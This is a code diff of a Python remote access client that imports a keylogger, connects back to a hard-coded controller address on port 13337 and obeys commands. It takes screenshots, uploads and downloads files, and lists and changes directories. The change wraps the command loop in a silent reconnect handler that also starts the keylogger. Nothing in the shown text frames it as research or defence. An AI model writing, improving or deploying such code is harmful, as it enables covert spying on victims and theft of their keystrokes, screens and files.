@@ -11,8 +11,8 @@ import key_logger
 path = ""
 def main():
     soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    #host = '192.168.43.85'
-    host = '176.59.192.255'
+    host = '192.168.43.211'
+    # host = '176.59.192.255'
     port = 13337
     PATH = "."
     try:
@@ -27,43 +27,56 @@ def main():
     is_active = True
 
     while is_active:
-        client_input = receive_input(soc, 5124)
-        print(client_input)
-        if "--quit--" in client_input:
-            print("Client is requesting to quit")
-            soc.close()
-            #print("Connection " + ip + ":" + port + " closed")
-            is_active = False
-        elif('scr' in client_input):
-            fname = screenshot.takescreenshot()
-            soc.send(fname.encode('utf-8'))
-            send_file(fname, soc)
-            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            soc.connect((host, port))
-        elif("push" in client_input):
-            load_file(soc)
-            is_active = False
-        elif("ls" in client_input):
-            g = [os.path.basename(i) for i in glob.glob("{}\\*".format(PATH))]
-            print(g)
-            s = "\n".join(g)
-            soc.sendall(s.encode('utf-8'))
-        elif("pull" in client_input):
-            name = soc.recv(1024)
+        try:
 
-            send_file(name, soc)
-            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            soc.connect((host, port))
+            client_input = receive_input(soc, 5124)
+            print(client_input)
+            if "--quit--" in client_input:
+                print("Client is requesting to quit")
+                soc.close()
+                #print("Connection " + ip + ":" + port + " closed")
+                is_active = False
+            elif('scr' in client_input):
+                fname = screenshot.takescreenshot()
+                soc.send(fname.encode('utf-8'))
+                send_file(fname, soc)
+                soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                soc.connect((host, port))
+            elif("push" in client_input):
+                load_file(soc)
+                is_active = False
+            elif("ls" in client_input):
+                g = [os.path.basename(i) for i in glob.glob("{}\\*".format(PATH))]
+                print(g)
+                s = "\n".join(g)
+                soc.sendall(s.encode('utf-8'))
+            elif("pull" in client_input):
+                name = soc.recv(1024)
 
-        elif("cd" in client_input):
-            name = soc.recv(1024)
-            if os.path.exists("{}\\{}".format(PATH, name.decode('utf-8'))):
-                
-                PATH += "\\{}".format(name.decode('utf-8'))
-                soc.sendall("Success".encode('utf-8'))
-            else:
-                soc.sendall("Netu".encode('utf-8'))
-            #is_active = False
+                send_file(name, soc)
+                soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                soc.connect((host, port))
+
+            elif("cd" in client_input):
+                name = soc.recv(1024)
+                if os.path.exists("{}\\{}".format(PATH, name.decode('utf-8'))):
+                    
+                    PATH += "\\{}".format(name.decode('utf-8'))
+                    soc.sendall("Success".encode('utf-8'))
+                else:
+                    soc.sendall("Netu".encode('utf-8'))
+                #is_active = False
+        except:
+            try:
+                soc.close()
+                soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                soc.connect((host, port))
+                print("connected")
+                key_logger.start_key_logger()
+            except:
+                pass
+
+            
 
 def load_file(c):
     print("Receiving...")
